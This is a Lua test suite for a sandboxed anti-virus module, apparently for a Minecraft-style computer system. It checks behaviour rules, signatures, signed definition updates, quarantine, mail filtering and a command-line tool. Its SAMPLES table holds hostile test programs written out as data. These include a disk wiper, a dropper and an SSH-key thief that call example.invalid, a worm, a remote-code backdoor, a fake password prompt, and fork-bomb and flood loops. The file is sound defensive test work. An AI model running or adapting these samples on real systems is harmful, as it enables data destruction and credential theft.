-- SPDX-License-Identifier: AGPL-3.0-or-later
local av = require("tsr.av")
local rules = require("tsr.av.rules")
local defs = require("tsr.av.defs")
local q = require("tsr.av.quarantine")
local cli = require("tsr.av.cli")
local hash = require("tsr.hash")
local crypto = require("tsr.crypto")
local vfs = require("tsr.vfs")

local ROOT = "/tmp/av-test"

--- Point every file the anti-virus uses into a scratch folder.
local function setup()
  if vfs.fs.exists(ROOT) then vfs.fs.delete(ROOT) end
  vfs.fs.makeDir(ROOT)
  av.CONFIG, av.LOG = ROOT .. "/av.json", ROOT .. "/av.log"
  defs.BUILTIN, defs.UPDATED, defs.STATE, defs.TRUST = ROOT .. "/builtin.json", ROOT .. "/updated.json", ROOT .. "/defs.state", ROOT .. "/trust.json"
  q.DIR = ROOT .. "/quarantine"
  vfs.writeFile(defs.BUILTIN, textutils.serializeJSON({ format = 1, version = 1, hashes = {}, patterns = {}, allow = {} }))
  av.loadDefs(true)
end

local function scan(src, path) return av.scanData(src, { path = path or "/home/test.lua" }) end

local function ids(r)
  local out = {}
  for _, f in ipairs(r.findings) do out[#out + 1] = f.id end
  return table.concat(out, ",")
end

local SAMPLES = {}

SAMPLES.wiper = [==[
-- totally harmless cleanup tool
for _, name in ipairs(fs.list("/")) do
  pcall(fs.delete, name)
end
os.reboot()
]==]

SAMPLES.wiper2 = [==[
fs.delete("/")
]==]

SAMPLES.dropper = [==[
local h = http.get("http://example.invalid/payload.lua")
local code = h.readAll()
h.close()
local f = fs.open("/startup.lua", "w")
f.write(code)
f.close()
load(code)()
]==]

SAMPLES.worm = [==[
local me = shell.getRunningProgram()
for _, side in ipairs(peripheral.getNames()) do
  if peripheral.getType(side) == "drive" then
    local path = peripheral.call(side, "getMountPath")
    if path then
      fs.copy(me, path .. "/startup")
      fs.copy(me, "/startup.lua")
    end
  end
end
]==]

SAMPLES.backdoor = [==[
while true do
  local id, msg = rednet.receive()
  local fn = load(msg)
  if fn then pcall(fn) end
end
]==]

SAMPLES.nocontrolt = [==[
os.pullEvent = os.pullEventRaw
while true do print("You cannot stop me") sleep(1) end
]==]

SAMPLES.bootloop = [==[
-- startup.lua
sleep(1)
os.reboot()
]==]

SAMPLES.thief = [==[
local f = fs.open("/etc/tsr/ssh/id_ed25519", "r")
local key = f.readAll()
f.close()
http.post("http://example.invalid/collect", key)
]==]

SAMPLES.phish = [==[
term.clear() term.setCursorPos(1, 1)
print("Session expired. Login again.")
write("Password: ")
local p = read("*")
http.post("http://example.invalid/p", p)
]==]

SAMPLES.flood = [==[
while true do
  rednet.broadcast("spam spam spam")
end
]==]

SAMPLES.forkbomb = [==[
while true do
  shell.openTab("shell")
end
]==]

SAMPLES.obfuscated = [==[
local s = {104,101,108,108,111,32,119,111,114,108,100}
local t = {}
for i = 1, #s do t[#t + 1] = string.char(s[i]) end
local code = table.concat(t)
load(code)()
]==]

SAMPLES.commands = [==[
commands.exec("op SomeoneElse")
commands.exec("gamemode creative @a")
]==]

SAMPLES.avkiller = [==[
fs.delete("/var/lib/tsr/av/defs.json")
shell.run("svc stop avd")
]==]

SAMPLES.sudo = [==[
local auth = require("tsr.auth")
auth.setSessionUser("root")
]==]

-- ordinary programs that must not be reported
local GOOD = {}

GOOD.miner = [==[
local depth = tonumber(...) or 10
for i = 1, depth do
  while turtle.detectDown() do turtle.digDown() end
  if not turtle.down() then break end
  if turtle.getFuelLevel() < 10 then turtle.refuel() end
end
for i = 1, depth do turtle.up() end
print("done")
]==]

GOOD.clock = [==[
local mon = peripheral.find("monitor")
mon.setTextScale(2)
while true do
  mon.clear() mon.setCursorPos(1, 1)
  mon.write(textutils.formatTime(os.time(), true))
  sleep(1)
end
]==]

GOOD.chat = [==[
rednet.open("top")
parallel.waitForAny(function()
  while true do
    local id, msg = rednet.receive("chat")
    print("<" .. id .. "> " .. tostring(msg))
  end
end, function()
  while true do
    local line = read()
    rednet.broadcast(line, "chat")
  end
end)
]==]

GOOD.logger = [==[
local f = fs.open("/log.txt", "a")
f.writeLine(textutils.formatTime(os.time()))
f.close()
if fs.exists("/old.log") then fs.delete("/old.log") end
local h = http.get("http://example.invalid/status")
if h then print(h.readAll()) h.close() end
]==]

test("source preparation: comments go, strings stay, line numbers are kept; entropy; recognising Lua", function()
  local code = rules.strip('local a = "-- not a comment" -- a comment\n--[[ block\ncomment ]] local b = [[long -- string]]\n--[==[ x ]==] print(a)')
  ok(code:find('"-- not a comment"', 1, true) and not code:find("-- a comment", 1, true) and not code:find("block", 1, true) and code:find("[[long -- string]]", 1, true) and code:find("print(a)", 1, true), code)
  eq(select(2, code:gsub("\n", "")), 3, "the line breaks of comments are kept")
  ok(rules.entropy("aaaa") == 0 and rules.entropy("abcd") == 2)
  ok(rules.entropy(string.rep(crypto.rand.bytes(64), 4)) > 5)
  ok(rules.looksLikeLua("local x = 1\nfunction f() return os.time() end") and not rules.looksLikeLua("Dear Alice, see you at the base."))
end)

test("behaviour rules: each kind of mischief is recognised", function()
  setup()
  local expect = {
    wiper = { "WIPE_DISK", "malicious" }, wiper2 = { "WIPE_DISK", "malicious" }, dropper = { "DROPPER", "malicious" }, worm = { "COPIES_ITSELF", "malicious" },
    backdoor = { "RUNS_RECEIVED_CODE", "suspicious" }, nocontrolt = { "BLOCKS_CTRL_T", nil }, thief = { "SENDS_SECRETS", "suspicious" }, phish = { "FAKE_PASSWORD_PROMPT", nil },
    flood = { "NETWORK_FLOOD", nil }, forkbomb = { "PROCESS_FLOOD", "suspicious" }, obfuscated = { "OBFUSCATED_LOAD", "suspicious" }, commands = { "COMMAND_ABUSE", "suspicious" },
    avkiller = { "ATTACKS_ANTIVIRUS", "suspicious" }, sudo = { "RAISES_PRIVILEGES", nil },
  }
  for name, e in pairs(expect) do
    local r = scan(SAMPLES[name])
    ok(ids(r):find(e[1], 1, true), name .. ": " .. ids(r))
    if e[2] then eq(r.verdict, e[2], name .. " " .. ids(r)) end
    ok(r.score > 0)
  end
  -- startup files that restart the computer
  local boot = av.scanData(SAMPLES.bootloop, { path = "/startup.lua" })
  ok(ids(boot):find("REBOOT_LOOP", 1, true), ids(boot))
  ok(not ids(scan(SAMPLES.bootloop, "/home/prog.lua")):find("REBOOT_LOOP", 1, true), "os.reboot in an ordinary program is fine")
  -- line numbers
  local w = scan(SAMPLES.wiper)
  local line
  for _, f in ipairs(w.findings) do if f.id == "WIPE_DISK" then line = f.line end end
  eq(line, 2)
  ok(w.findings[1].description and w.findings[1].score > 0)
  -- worms and droppers add up
  ok(ids(scan(SAMPLES.dropper)):find("DROPPER", 1, true) and ids(scan(SAMPLES.worm)):find("WORM", 1, true))
end)

test("ordinary programs are not reported; comments and plain text do not count", function()
  setup()
  for name, src in pairs(GOOD) do
    local r = scan(src)
    eq(r.verdict, "clean", name .. ": " .. ids(r))
  end
  eq(scan('-- fs.delete("/")\n--[[ http.get(x) load(y) ]] print("hi")').verdict, "clean")
  -- documentation that mentions dangerous calls is not a program
  local doc = av.scanData("Never write fs.delete(\"/\") in your programs.\nThe worst thing is fs.delete(\"/rom\").", { path = "/home/notes.txt" })
  eq(doc.verdict, "clean") eq(doc.skipped, "not a program")
  -- the same words in a .lua file are code
  eq(av.scanData('fs.delete("/")', { path = "/home/x.lua" }).verdict, "malicious")
  -- binary data is only checked against signatures
  local bin = av.scanData("\0\1\2" .. string.rep("x", 100), { path = "/home/image.bin" })
  eq(bin.verdict, "clean") eq(bin.skipped, "binary")
  -- very large files are not analysed
  local big = av.scanData("local x = 1\n" .. string.rep("-- padding\n", 40000) .. 'fs.delete("/")', { path = "/home/big.lua" })
  eq(big.skipped, "too large")
  -- the downloader pattern of ordinary installers is suspicious on its own, not malicious
  local installer = scan('local h = http.get("http://example.invalid/i.lua")\nlocal f = load(h.readAll())\nf()')
  eq(installer.verdict, "suspicious") ok(ids(installer):find("DOWNLOAD_AND_RUN", 1, true))
end)

test("signatures: known bad and known good files, patterns, the standard test file", function()
  setup()
  local bad = "print('hello from a known bad file')"
  local d = { format = 1, version = 5, hashes = { [hash.sha256(bad)] = "Fake.Bad.Sample" }, patterns = { { id = "SIG-1", name = "Contains the secret marker", pattern = "XYZZY-MARKER", plain = true, score = 12 },
    { id = "SIG-2", name = "A pattern", pattern = "evil%d+", score = 6 } }, allow = {} }
  vfs.writeFile(defs.BUILTIN, textutils.serializeJSON(d))
  av.loadDefs(true)
  local r = scan(bad)
  eq(r.verdict, "malicious") ok(ids(r):find("KNOWN:Fake.Bad.Sample", 1, true))
  eq(scan("local x = 1 -- XYZZY-MARKER").verdict, "malicious")
  eq(scan("local evil42 = 1").verdict, "suspicious")
  -- the allow list wins
  local good = "fs.delete('/') -- but this exact file is vouched for"
  d.allow = { [hash.sha256(good)] = "the maintainer's tool" }
  vfs.writeFile(defs.BUILTIN, textutils.serializeJSON(d))
  av.loadDefs(true)
  local g = scan(good)
  eq(g.verdict, "clean") eq(g.allowed, "the maintainer's tool")
  -- the test file
  local t = av.scanData(rules.TEST_STRING .. "\n", { path = "/home/eicar.txt" })
  eq(t.verdict, "malicious") ok(ids(t):find("TEST_FILE", 1, true))
  -- thresholds can be changed
  vfs.writeFile(av.CONFIG, textutils.serializeJSON({ suspicious_at = 2, malicious_at = 3 }))
  eq(scan(SAMPLES.nocontrolt).verdict, "malicious")
  vfs.fs.delete(av.CONFIG)
end)

test("signed definition updates: trust, signatures, versions, tampering", function()
  setup()
  local secret, public = defs.keygen()
  local other, otherPublic = defs.keygen()
  local text = textutils.serializeJSON({ format = 1, version = 7, issued = 1760000000, hashes = { [string.rep("a", 64)] = "Bad.One" }, patterns = {}, allow = {} })
  local sig = defs.sign(text, secret)
  -- nobody is trusted yet
  local v, why = defs.install(text, sig, { now = 1760000100 })
  ok(v == nil and why:find("not from a publisher you trust", 1, true), tostring(why))
  ok(defs.trust("community", public))
  ok(not defs.trust("again", public))
  ok(select(2, defs.trust("x", "short")):find("44 characters", 1, true))
  v, why = defs.install(text, sig, { now = 1760000100 })
  eq(v, 7) eq(why, "community")
  eq(av.loadDefs(true).hashes[string.rep("a", 64)], "Bad.One")
  ok(av.loadDefs().sources:find("updated v7 (community)", 1, true), av.loadDefs().sources)
  -- older or equal versions are refused (rollback protection)
  local old = textutils.serializeJSON({ format = 1, version = 6, hashes = {}, patterns = {}, allow = {} })
  v, why = defs.install(old, defs.sign(old, secret), { now = 1760000100 })
  ok(v == nil and why:find("not newer", 1, true), tostring(why))
  -- a signature of another key, a changed text, a damaged signature
  local text8 = textutils.serializeJSON({ format = 1, version = 8, hashes = {}, patterns = {}, allow = { [string.rep("b", 64)] = "x" } })
  ok(defs.install(text8, defs.sign(text8, other), { now = 1760000100 }) == nil)
  ok(defs.install(text8 .. " ", defs.sign(text8, secret), { now = 1760000100 }) == nil)
  ok(select(2, defs.install(text8, "AAAA", { now = 1760000100 })):find("missing or damaged", 1, true))
  -- a definitions file claiming to come from the future
  local future = textutils.serializeJSON({ format = 1, version = 9, issued = 1770000000, hashes = {}, patterns = {}, allow = {} })
  ok(select(2, defs.install(future, defs.sign(future, secret), { now = 1760000100 })):find("future", 1, true))
  -- broken entries
  local broken = textutils.serializeJSON({ format = 1, version = 9, hashes = { short = "x" }, patterns = {}, allow = {} })
  ok(select(2, defs.install(broken, defs.sign(broken, secret), { now = 1760000100 })):find("bad hash entry", 1, true))
  local badPattern = textutils.serializeJSON({ format = 1, version = 9, hashes = {}, patterns = { { id = "P", pattern = "(" } }, allow = {} })
  ok(select(2, defs.install(badPattern, defs.sign(badPattern, secret), { now = 1760000100 })):find("not valid", 1, true))
  -- changing the installed file by hand makes it be ignored
  vfs.writeFile(defs.UPDATED, text:gsub("Bad.One", "Changed"))
  eq(av.loadDefs(true).hashes[string.rep("a", 64)], nil)
  -- publishers can be removed
  ok(defs.untrust("community"))
  ok(not defs.untrust("community"))
  eq(#defs.keys(), 0)
  -- update from a file with a signature next to it, and from a web address through a fetch function
  ok(defs.trust("community", public))
  vfs.writeFile(ROOT .. "/pub.json", text8)
  vfs.writeFile(ROOT .. "/pub.json.sig", defs.sign(text8, secret))
  local nv = defs.update(ROOT .. "/pub.json", { now = 1760000100 })
  eq(nv, 8)
  local text10 = textutils.serializeJSON({ format = 1, version = 10, hashes = {}, patterns = {}, allow = {} })
  local sig10 = defs.sign(text10, secret)
  local fetched = {}
  local got = defs.update("http://defs.lan/av.json", { now = 1760000100, get = function(url) fetched[#fetched + 1] = url return url:find("%.sig$") and sig10 or text10 end })
  eq(got, 10) eq(fetched, { "http://defs.lan/av.json", "http://defs.lan/av.json.sig" })
  local nf, nferr = defs.update(ROOT .. "/missing.json")
  ok(nf == nil and nferr:find("cannot read", 1, true))
  ok(select(2, defs.update("http://defs.lan/x", { get = function() return nil, "timeout" end })):find("timeout", 1, true))
end)

test("scanning a folder: quarantine, delete, known package files, removable disks", function()
  setup()
  vfs.fs.makeDir(ROOT .. "/disk")
  vfs.writeFile(ROOT .. "/disk/startup.lua", SAMPLES.dropper)
  vfs.writeFile(ROOT .. "/disk/readme.txt", "just a note about fs.delete")
  vfs.writeFile(ROOT .. "/disk/tool.lua", GOOD.miner)
  vfs.writeFile(ROOT .. "/disk/sus.lua", SAMPLES.backdoor)
  vfs.fs.makeDir(ROOT .. "/disk/sub")
  vfs.writeFile(ROOT .. "/disk/sub/clock.lua", GOOD.clock)
  local seen = {}
  local s = av.scanTree(ROOT .. "/disk", { progress = function(path, r) seen[path] = r.verdict end, action = "report" })
  eq({ s.scanned, s.clean, s.suspicious, s.malicious }, { 5, 3, 1, 1 })
  eq(seen[ROOT .. "/disk/startup.lua"], "malicious") eq(seen[ROOT .. "/disk/sus.lua"], "suspicious")
  ok(vfs.fs.exists(ROOT .. "/disk/startup.lua"), "report only")
  ok(vfs.readFile(av.LOG):find("malicious " .. ROOT .. "/disk/startup.lua", 1, true))
  -- quarantine moves the malicious file, not the suspicious one
  s = av.scanTree(ROOT .. "/disk", { action = "quarantine" })
  ok(not vfs.fs.exists(ROOT .. "/disk/startup.lua") and vfs.fs.exists(ROOT .. "/disk/sus.lua"))
  local items = q.list()
  eq(#items, 1) eq(items[1].path, ROOT .. "/disk/startup.lua")
  ok(table.concat(items[1].findings, ","):find("DROPPER", 1, true))
  ok(vfs.fs.exists(q.DIR .. "/" .. items[1].id .. ".q"))
  -- restore (or refuse when the place is taken), delete, purge
  local back = assert(q.restore(items[1].id))
  eq(back, ROOT .. "/disk/startup.lua")
  eq(#q.list(), 0)
  ok(q.add(ROOT .. "/disk/startup.lua", { findings = { { id = "X" } }, score = 10, verdict = "malicious" }))
  ok(select(2, q.restore(q.list()[1].id, ROOT .. "/disk/tool.lua")):find("exists already", 1, true))
  eq(q.purge(1), 0)
  ok(q.delete(q.list()[1].id))
  ok(not q.delete("nothing"))
  -- delete action
  vfs.writeFile(ROOT .. "/disk/startup.lua", SAMPLES.wiper2)
  av.scanTree(ROOT .. "/disk", { action = "delete" })
  ok(not vfs.fs.exists(ROOT .. "/disk/startup.lua"))
  -- files of installed packages with their recorded checksum are skipped; modified ones are scanned
  local db = require("tsr.pkg.db")
  local text = GOOD.clock
  vfs.writeFile(ROOT .. "/disk/pkgfile.lua", text)
  db.set("avtestpkg", { version = "1", files = { { path = ROOT .. "/disk/pkgfile.lua", sha256 = hash.sha256(text), size = #text } } })
  local k = av.scanTree(ROOT .. "/disk/pkgfile.lua", {})
  eq(k.known, 1) eq(k.scanned, 0)
  vfs.writeFile(ROOT .. "/disk/pkgfile.lua", SAMPLES.wiper2)
  k = av.scanTree(ROOT .. "/disk/pkgfile.lua", {})
  eq(k.known, 0) eq(k.malicious, 1)
  db.remove("avtestpkg")
  -- the daemon's floppy scan
  vfs.fs.delete(ROOT .. "/disk/pkgfile.lua")
  vfs.writeFile(ROOT .. "/disk/startup.lua", SAMPLES.worm)
  local avd = require("tsr.av.daemon")
  local saved = peripheral.call
  peripheral.call = function(side, method) if side == "right" and method == "getMountPath" then return ROOT .. "/disk" end return saved(side, method) end
  local sum = avd.scanDisk("right", av.settings())
  peripheral.call = saved
  ok(sum and sum.malicious == 1, "the worm on the floppy was found")
end)

test("the programs on this system are not reported (false-positive check)", function()
  setup()
  local flagged = {}
  local s = av.scanTree("/sys", { skipKnown = false, progress = function(path, r) if r.verdict ~= "clean" then flagged[#flagged + 1] = path .. " " .. av.describe(r) end end })
  local s2 = av.scanTree("/usr", { skipKnown = false, progress = function(path, r) if r.verdict ~= "clean" then flagged[#flagged + 1] = path .. " " .. av.describe(r) end end })
  ok(s.scanned > 100, "scanned " .. s.scanned)
  eq(flagged, {}, table.concat(flagged, "\n"))
end)

--- A mail system without a network, for the filter tests.
local function fakeMail()
  local mailMod = require("tsr.mail")
  local storeMod = require("tsr.mail.store")
  local Sim = dofile("/tests/lib/inetsim.lua")
  local sim = Sim.new()
  local h = sim:host("mx")
  local st = storeMod.new({ root = ROOT .. "/mb", users = ROOT .. "/users.db", iterations = 2 })
  return mailMod.new(h, { hostname = "mx.lan", domains = { "example.lan" }, root = ROOT .. "/mb", users = ROOT .. "/users.db", queueDir = ROOT .. "/queue" }, st)
end

test("mail: attachments with malware are refused, doubtful ones go to Spam, users cannot send malware", function()
  setup()
  local msg = require("tsr.mail.message")
  local m = fakeMail()
  ok(av.installMail(m, {}))
  local function mailWith(att, body) return msg.build({ from = "a@far.lan", to = "alice@example.lan", subject = "files", body = body or "see attached", host = "far.lan", attachments = att }) end
  local function judge(raw)
    local ctx = { ip = "10.9.9.9", helo = "far.lan", sender = "a@far.lan", rcpts = { "alice@example.lan" }, raw = raw }
    local v = m:runFilters(ctx)
    return v, ctx
  end
  local v, ctx = judge(mailWith({ { name = "tool.lua", data = GOOD.miner, type = "text/plain" } }))
  eq(v[1], "accept")
  local joined = table.concat(ctx.add, "\n")
  ok(joined:find("X-Virus-Status: Clean", 1, true) and joined:find("X-Virus-Scanned: tessera-av 1", 1, true), joined)
  v, ctx = judge(mailWith({ { name = "free_op.lua", data = SAMPLES.dropper, type = "text/plain" } }))
  eq(v[1], "reject") eq(v[2], 554)
  ok(v[3]:find("malware: malicious in free_op.lua", 1, true) and v[3]:find("DROPPER", 1, true), v[3])
  v, ctx = judge(mailWith({ { name = "net.lua", data = SAMPLES.backdoor, type = "text/plain" } }))
  eq(v[1], "spam") ok(v[2]:find("virus-suspect", 1, true))
  ok(table.concat(ctx.add, "\n"):find("X-Virus-Status: Suspicious", 1, true))
  -- code pasted into the message text
  v = judge(mailWith(nil, SAMPLES.wiper .. "\n-- run this on your computer for free diamonds, it is totally safe, trust me, really, I promise"))
  eq(v[1], "reject")
  -- the standard test file
  v = judge(mailWith({ { name = "eicar.txt", data = rules.TEST_STRING, type = "text/plain" } }))
  eq(v[1], "reject")
  -- tagging only
  local m2 = fakeMail()
  av.installMail(m2, { action = "tag" })
  v = m2:runFilters({ ip = "10.9.9.9", helo = "far.lan", sender = "a@far.lan", rcpts = {}, raw = mailWith({ { name = "x.lua", data = SAMPLES.wiper2, type = "text/plain" } }) })
  eq(v[1], "spam")
  -- quarantine action: delivered to the Spam folder
  local m3 = fakeMail()
  av.installMail(m3, { action = "quarantine" })
  v = m3:runFilters({ ip = "10.9.9.9", helo = "far.lan", sender = "a@far.lan", rcpts = {}, raw = mailWith({ { name = "x.lua", data = SAMPLES.wiper2, type = "text/plain" } }) })
  eq(v[1], "spam") ok(v[2]:find("^virus:"))
  -- outgoing mail from users
  local out = m:runOutboundFilters({ auth = "alice", sender = "alice@example.lan", rcpts = { "x@y.lan" }, ip = "10.0.0.5" }, mailWith({ { name = "w.lua", data = SAMPLES.wiper2, type = "text/plain" } }))
  eq(out[1], "reject") ok(out[3]:find("Not sent", 1, true), out[3])
  eq(m:runOutboundFilters({ auth = "alice", sender = "alice@example.lan", rcpts = { "x@y.lan" }, ip = "10.0.0.5" }, mailWith({ { name = "ok.lua", data = GOOD.clock, type = "text/plain" } })), nil)
end)

local function script()
  local out = { lines = {}, errors = {} }
  out.ctx = { say = function(t) out.lines[#out.lines + 1] = t end, err = function(t) out.errors[#out.errors + 1] = t end }
  function out.text() return table.concat(out.lines, "\n") end
  return out
end

test("the av command", function()
  setup()
  local function run(args) local s = script() local okRun = cli.run(args, s.ctx) return okRun, s end
  vfs.fs.makeDir(ROOT .. "/f")
  vfs.writeFile(ROOT .. "/f/good.lua", GOOD.miner)
  vfs.writeFile(ROOT .. "/f/bad.lua", SAMPLES.wiper)
  local good, s = run({ "scan", ROOT .. "/f" })
  ok(not good)
  ok(s.text():find("MALICIOUS  " .. ROOT .. "/f/bad.lua", 1, true) and s.text():find("WIPE_DISK (line 2): deletes the whole disk", 1, true), s.text())
  ok(s.lines[#s.lines]:find("scanned 2 file(s): 1 clean, 0 suspicious, 1 malicious", 1, true), s.lines[#s.lines])
  good, s = run({ "scan", ROOT .. "/f/good.lua" })
  ok(good)
  good, s = run({ "scan", ROOT .. "/nothing" })
  ok(not good and s.errors[1]:find("no such file", 1, true))
  good, s = run({ "check", ROOT .. "/f/bad.lua" })
  ok(not good and s.text():find("malicious", 1, true) and s.text():find("+10  WIPE_DISK (line 2)", 1, true) and s.text():find("score 10 (suspicious from 5, malicious from 10)", 1, true), s.text())
  _, s = run({ "status" })
  ok(s.text():find("definitions:  built-in v1", 1, true) and s.text():find("publishers:   none trusted", 1, true) and s.text():find("quarantine:   0 item", 1, true), s.text())
  -- quarantine through the command
  _, s = run({ "scan", ROOT .. "/f", "--quarantine" })
  ok(s.text():find("moved to the quarantine as ", 1, true))
  _, s = run({ "quarantine", "list" })
  local id = s.lines[1]:match("^(%w+)  ")
  ok(id and s.lines[1]:find("WIPE_DISK", 1, true), s.lines[1])
  good = run({ "quarantine", "restore", id })
  ok(good and vfs.fs.exists(ROOT .. "/f/bad.lua"))
  _, s = run({ "quarantine", "list" })
  eq(s.lines, { "the quarantine is empty" })
  -- settings
  ok(run({ "config", "set", "malicious_at=20", "action=quarantine", "scan_packages=true", "sources=http://a.lan/d.json,/disk/d.json" }))
  local cfg = av.settings()
  eq(cfg.malicious_at, 20) eq(cfg.action, "quarantine") eq(cfg.scan_packages, true) eq(cfg.sources, { "http://a.lan/d.json", "/disk/d.json" })
  good, s = run({ "config", "set", "action=explode" })
  ok(not good and s.errors[1]:find("report, quarantine or delete", 1, true))
  good, s = run({ "config", "set", "colour=blue" })
  ok(not good and s.errors[1]:find("unknown setting", 1, true))
  vfs.fs.delete(av.CONFIG)
  -- publishing and accepting definitions
  good, s = run({ "defs", "keygen", ROOT .. "/pub.key" })
  local pub = s.lines[2]:match(": (%S+)$")
  ok(good and #pub == 44, s.text())
  vfs.writeFile(ROOT .. "/defs.json", textutils.serializeJSON({ format = 1, version = 3, hashes = {}, patterns = { { id = "NEW-1", pattern = "ZZTOP", plain = true, score = 10 } }, allow = {} }))
  ok(run({ "defs", "sign", ROOT .. "/defs.json", ROOT .. "/pub.key" }))
  good, s = run({ "update", ROOT .. "/defs.json" })
  ok(not good and s.errors[1]:find("not from a publisher you trust", 1, true), s.errors[1])
  ok(run({ "trust", "add", "me", pub }))
  _, s = run({ "trust", "list" })
  ok(s.lines[1]:find("me", 1, true) and s.lines[1]:find(pub, 1, true))
  good, s = run({ "update", ROOT .. "/defs.json" })
  ok(good and s.lines[1]:find("definitions v3 from", 1, true) and s.lines[1]:find("signed by me", 1, true), s.text())
  eq(scan("local x = 'ZZTOP'").verdict, "malicious")
  _, s = run({ "defs", "info" })
  ok(s.text():find("signed by me", 1, true))
  good, s = run({ "update" })
  ok(not good and s.errors[1]:find("no source given", 1, true))
  -- the harmless test file
  ok(run({ "testfile", ROOT .. "/eicar.txt" }))
  good, s = run({ "check", ROOT .. "/eicar.txt" })
  ok(not good and s.text():find("TEST_FILE", 1, true))
  good, s = run({ "frob" })
  ok(not good and s.errors[1]:find("usage: av", 1, true))
end)
